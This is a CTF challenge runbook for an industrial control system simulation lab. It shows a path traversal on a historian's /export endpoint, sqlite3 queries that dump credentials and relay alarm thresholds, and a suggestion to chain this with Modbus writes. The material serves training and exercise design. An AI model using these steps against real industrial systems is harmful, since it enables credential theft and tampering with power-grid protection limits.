# Runbook: historian path traversal

Unauthenticated path traversal on the historian `/export` endpoint returns the raw SQLite
database. The database contains alarm thresholds, credentials, and process history.

- Technique: [3: data exfiltration](../../attack-surface.md)
- Challenge type: Network (PCAP) or Forensic
- Difficulty: Intermediate

## Components to start

```
cd ics-simlab
make generate && make build
docker compose -f zones/operational/docker-compose.yml up -d uupl-historian
```

No other components needed. The historian runs standalone.

## Attack path

```bash
# Recon: list available assets
curl http://10.10.2.10:8080/assets
# Returns JSON: ["turbine", "relay_a", "relay_b", "meter"]

# Normal query (for context in PCAP)
curl "http://10.10.2.10:8080/report?asset=turbine"
# Returns recent time-series data

# Path traversal: download the full database
curl "http://10.10.2.10:8080/export?tag=../historian.db" -o historian.db

# Extract alarm configuration
sqlite3 historian.db "SELECT * FROM alarm_config;"
# asset         | threshold_type | value  | last_updated
# turbine_rpm   | overspeed      | 1800   | 2024-01-15
# relay_a_oc    | overcurrent    | 150    | 2023-11-02
# relay_a_uv    | undervoltage   | 195    | 2023-11-02

# Extract credentials
sqlite3 historian.db ".tables"
# alarm_config  credentials  sensor_data  events

sqlite3 historian.db "SELECT * FROM credentials;"
# hist_admin | Historian2015 | ssh
# hist_read  | history2017   | api
```

## Flag placement

Place the flag as a row in the `credentials` table with a service name of `ctf_flag`:

```sql
INSERT INTO credentials VALUES ('flag', 'RM{...}', 'ctf_flag');
```

Add this to the historian container's database initialisation script. The participant
downloads the database, lists the tables, queries credentials, and finds the flag.

Alternatively, place it in the `alarm_config` table as an unusually named threshold entry.
That variant rewards participants who read the table carefully rather than grepping for
obvious column names.

## Artefact

For a Network challenge, the PCAP contains:
* GET /assets: response lists asset names
* GET /report?asset=turbine: normal response (establishes expected behaviour)
* GET /export?tag=../historian.db: response is a binary SQLite file (magic bytes 53 51 4C 69 74 65)
* No authentication headers at any point

Capture with:

```
tcpdump -i any -w historian-traversal.pcap port 8080
```

For a Forensic challenge, provide the PCAP without the database file. The participant
reconstructs the database from the HTTP response body in the capture.

## The design flaw

The `/export` endpoint was designed for exporting tag data by name. The `tag` parameter
is passed directly to a file path without sanitisation. The result is the full database,
including credentials that are reused for SSH access and alarm thresholds that tell an
attacker exactly where the relay protection limits are. The historian is dual-purpose: it
is both the exfiltration target and the recon stage for the relay attack.

## Chaining attacks

Chain this with the IED relay runbook: the alarm thresholds extracted here map directly
to the relay holding registers `HR[0]` to `HR[2]`. A challenge that requires both steps (path
traversal to learn thresholds, then Modbus write to manipulate them) covers techniques 3
and 6 in sequence and sits at Advanced difficulty.
